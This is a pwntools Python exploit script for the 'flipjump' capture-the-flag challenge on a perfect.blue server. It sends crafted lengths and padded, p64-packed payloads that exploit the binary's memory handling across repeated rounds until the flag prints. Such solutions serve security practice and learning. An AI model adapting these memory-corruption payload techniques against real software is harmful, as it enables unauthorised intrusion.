from pwn import *
import sys

elf = ELF("flipjump")

# io = process(elf.path)
io = remote("flipjump.chal.perfect.blue", 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdb_args = ["-ex", "init-pwndbg"])


win_cnt = 0
while True:

    io.sendafter(b"length:\n", b"\x10\x01")
    io.sendafter(b"code:\n", b"A" * 0x110)

    io.recvuntil(b"[")
    r = io.recv(1)
    num = int(r.decode()) << 3

    io.recvuntil(b"Bit ")
    r = io.recv(1)
    num += int(r.decode())

    print("Magic number:" + str(num))

    io.sendafter(b"length:\n", b"\x60\x01")

    p = b""
    cnt = 1
    for i in range(4):
        if(((num >> i) & 1) == 1):
            p += p64(64 * 11 + i)
            p += p64(cnt)
            cnt += 1

    p += b"A" * (0x50 - len(p))
    p += b"X" * 8
    p += p64(0)
    p += b"A" * (0x160 - len(p))

    io.sendafter(b"code:\n", p)
    
    if(io.recvline() == b"Correct!\n"):
        win_cnt += 1
    if(win_cnt == 0x45):
        r = io.recvline()
        print("############ FLAG ############")
        print(r.decode())
        print("##############################")
        break
    io.sendafter(b"(Y/N)\n", b"Y")


io.interactive()
